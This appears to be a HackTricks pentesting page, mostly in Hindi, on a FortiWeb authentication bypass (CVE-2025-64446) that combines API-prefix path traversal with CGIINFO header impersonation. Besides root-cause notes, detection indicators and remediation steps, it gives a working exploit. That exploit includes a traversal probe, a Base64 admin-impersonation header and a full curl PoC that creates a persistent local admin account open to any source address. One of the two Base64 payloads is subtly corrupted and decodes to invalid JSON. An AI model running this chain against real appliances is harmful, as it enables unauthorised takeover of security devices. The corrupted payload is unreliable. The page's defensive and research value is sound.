# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Fortinet FortiWeb `/cgi-bin/fwbcgi` पर एक केंद्रीय CGI dispatcher एक्सपोज़ करता है। दो बग चेन एक unauthenticated remote attacker को सक्षम बनाते हैं कि:
- एक वैध API-prefix के साथ URL की शुरुआत करके और डायरेक्टरी ट्रैवर्सल करके `fwbcgi` तक पहुँचा जा सके।
- एक विशेष HTTP header प्रदान करके CGI द्वारा पहचान के रूप में भरोसा किए जाने पर किसी भी उपयोगकर्ता (समेत बिल्ट‑इन `admin`) का impersonate किया जा सके।

विक्रेता परामर्श: FG‑IR‑25‑910 (CVE‑2025‑64446). रियल‑वर्ल्ड में इसका दुरुपयोग करके स्थायी `admin` उपयोगकर्ता बनाए जाने की घटनाएँ देखी गई हैं।

प्रभावित संस्करण (जैसा सार्वजनिक रूप से दस्तावेजीकृत):
- 8.0 < 8.0.2
- 7.6 < 7.6.5
- 7.4 < 7.4.10
- 7.2 < 7.2.12
- 7.0 < 7.0.12
- 6.4 ≤ 6.4.3
- 6.3 ≤ 6.3.23

FortiWeb 8.0.2 नीचे दिए गए traversal probe के लिए HTTP 403 लौटाता है।

## त्वरित भेद्यता जाँच

- Path traversal from API prefix to `fwbcgi`:
```http
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: <target>
```
- व्याख्या: HTTP 200 → likely vulnerable; HTTP 403 → patched.

## मूल कारण श्रृंखला

1) API-prefix path traversal to internal CGI
- कोई भी request path जो एक मान्य FortiWeb API prefix (e.g., `/api/v2.0/cmdb/` or `/api/v2.0/cmd/`) से शुरू होता है, `../` के साथ `/cgi-bin/fwbcgi` तक traverse कर सकता है।

2) Minimal-body validation bypass
- एक बार `fwbcgi` तक पहुँच जाने पर, पहला gate per-path फ़ाइल `/var/log/inputcheck/` द्वारा key किए गए एक उदार JSON चेक का प्रदर्शन करता है। यदि फ़ाइल अनुपस्थित है तो चेक तुरंत पास हो जाता है। यदि मौजूद है, तो body को केवल वैध JSON होना चाहिए। न्यूनतम अनुपालन के लिए `{}` का उपयोग करें।

3) Header-driven user impersonation
- प्रोग्राम CGI environment variable `HTTP_CGIINFO` (HTTP header `CGIINFO` से निकला हुआ) पढ़ता है, उसे Base64-decode करता है, JSON parse करता है, और attributes सीधे login context में कॉपी कर देता है, domain/VDOM सेट करते हुए। रुचि के keys:
- `username`, `loginname`, `vdom`, `profname`
- Example JSON to impersonate the built-in admin:
```json
{
"username": "admin",
"profname": "prof_admin",
"vdom": "root",
"loginname": "admin"
}
```
उपरोक्त का Base64 (जैसा वास्तविक दुनिया में उपयोग किया जाता है):
```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```
## एंड-टू-एंड दुरुपयोग पैटर्न (अनप्रमाणित → admin)

1) API-prefix traversal के माध्यम से `/cgi-bin/fwbcgi` तक पहुँचें.  
2) इनपुट जांच को संतुष्ट करने के लिए कोई भी वैध JSON बॉडी (उदा., `{}`) प्रदान करें.  
3) `CGIINFO: <base64(json)>` header भेजें, जहाँ JSON लक्ष्य पहचान को परिभाषित करता है.  
4) `fwbcgi` द्वारा अपेक्षित backend JSON POST करें ताकि privileged actions निष्पादित किए जा सकें (उदा., persistence के लिए एक admin user बनाना).

### न्यूनतम cURL PoC

- Probe traversal exposure:
```bash
curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
- admin का नक़ल करके एक नया स्थानीय admin user बनाएं:
```bash
# Base64(JSON) for admin impersonation
B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='

curl -ik \
-H "CGIINFO: $B64" \
-H 'Content-Type: application/json' \
-X POST \
--data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
नोट:
- यदि `/var/log/inputcheck/<path>.json` मौजूद नहीं है तो कोई भी मान्य JSON बॉडी पर्याप्त है (उदा., `{}`)।
- Action schema FortiWeb-आंतरिक है; ऊपर दिया उदाहरण पूर्ण privileges वाले एक लोकल admin को जोड़ता है।

## डिटेक्शन

- API-प्रिफिक्स पाथ्स जिनमें `../` शामिल हो कर `/cgi-bin/fwbcgi` तक पहुँचने वाली रिक्वेस्ट्स (उदा., `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`)।
- हेडर `CGIINFO` का मौजूद होना जिसमें Base64 JSON हो और उसमें keys `username`/`loginname`/`vdom`/`profname` शामिल हों।
- बैकएंड आर्टिफैक्ट्स:
- `/var/log/inputcheck/` के अंतर्गत प्रति-पाथ फ़ाइलें (gate configuration)।
- अनपेक्षित admin निर्माण और कॉन्फ़िगरेशन परिवर्तन।
- त्वरित सत्यापन: traversal probe का 200 लौटाना (exposed) बनाम 403 (fixed builds में blocked)।

## निवारण

- वेंडर एडवाइजरी के अनुसार fixed releases (उदा.: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12) में अपग्रेड करें।
- पैच लगने तक:
- FortiWeb management plane को अनट्रस्टेड नेटवर्क्स के सामने एक्सपोज़ न करें।
- reverse-proxy/WAF नियम जोड़ें, जो ब्लॉक करें:
- वो पाथ जो `/api/` से शुरू होते हैं और जिनमें `../cgi-bin/fwbcgi` होता है।
- वे रिक्वेस्ट्स जिनमें `CGIINFO` हेडर हो।
- ऊपर दिए गए डिटेक्शन संकेतकों की निगरानी और अलर्टिंग करें।

## References

- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)

{{#include ../../banners/hacktricks-training.md}}
